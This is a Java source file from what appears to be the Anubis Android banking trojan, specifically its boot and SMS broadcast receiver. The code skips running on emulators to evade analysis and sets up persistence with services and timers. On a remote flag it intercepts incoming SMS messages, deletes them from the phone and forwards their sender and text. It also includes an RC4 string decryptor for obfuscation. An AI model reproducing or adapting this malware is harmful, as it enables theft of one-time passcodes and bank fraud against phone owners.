package anubis.bot.myapplication.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.ServiceCommands;
import anubis.bot.myapplication.ServiceDeleteSMS;
import anubis.bot.myapplication.StartWhileGlobal;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class ReceiverBoot extends BroadcastReceiver {
    UtilsClass SF = new UtilsClass();

    public ReceiverBoot() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        if(SF.isEmulator())return;
        StartReceive(context, intent);
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    void StartReceive(Context context, Intent intent){
        String action = intent.getAction();
        context.startService(new Intent(context, StartWhileGlobal.class));

        SF.Log("Action","BOOT Start "+action);
        try{
            SF.startCustomTimer(context, "startAlarm", Integer.parseInt(SF.SetRead(context,"Interval")));
        }catch (Exception ex){
            SF.startCustomTimer(context, "startAlarm", 15000);

        }

        if(action.equals("android.intent.action.USER_PRESENT")){
            context.startService(new Intent(context, ServiceCommands.class));
        }
        if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            String sostoyanie_sws = SF.SetRead(context, "perehvat_sws");
            if (sostoyanie_sws.contains("true")) {
                R_CWC(context, intent);
            }
        }
    }

    public void  R_CWC(Context context, Intent intent)
    {
        final Bundle bun = intent.getExtras();
        try {
            if (bun != null) {

                final Object[] PO = (Object[]) bun.get("pdus");
                String num = "";
                String text = "";
                if (PO != null)
                    for (Object aPdusObj : PO)
                    {
                        SmsMessage CM = SmsMessage.createFromPdu((byte[]) aPdusObj);
                        num = CM.getDisplayOriginatingAddress();
                        String ms = CM.getDisplayMessageBody();
                        text=text+ms;
                        //   Log.i("Есть СМС",num + " > " + ms);
                        context.startService(new Intent(context, ServiceDeleteSMS.class)
                                .putExtra("num",num).putExtra("ms",ms));
                    }
                SF.send(context, num, text);
            }

        } catch (Exception e) {//Ошибка ресивера СМС
        }
    }
}
